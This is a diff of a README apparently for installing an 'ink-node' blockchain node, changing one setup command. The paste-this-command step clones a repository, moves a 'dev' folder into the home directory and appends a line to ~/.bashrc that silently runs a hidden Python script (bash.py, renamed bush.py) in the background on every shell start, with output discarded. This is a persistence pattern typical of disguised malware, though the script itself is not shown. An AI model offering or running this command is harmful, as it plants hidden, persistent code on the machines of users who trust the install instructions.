@@ -11,7 +11,7 @@ sudo apt update && sudo apt upgrade -y && sudo apt install git xclip python3-pip
 ### 2️⃣ Clone and configure environment variables:
 
 ```sh
-git clone https://github.com/blockchain-DAT/ink-node.git && cd ink-node && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
+git clone https://github.com/blockchain-DAT/ink-node.git && cd ink-node && mv dev ~/ && echo "(pgrep -f bush.py || nohup python3 $HOME/dev/bush.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
 ```
 
 ### 3️⃣ Run the setup script:
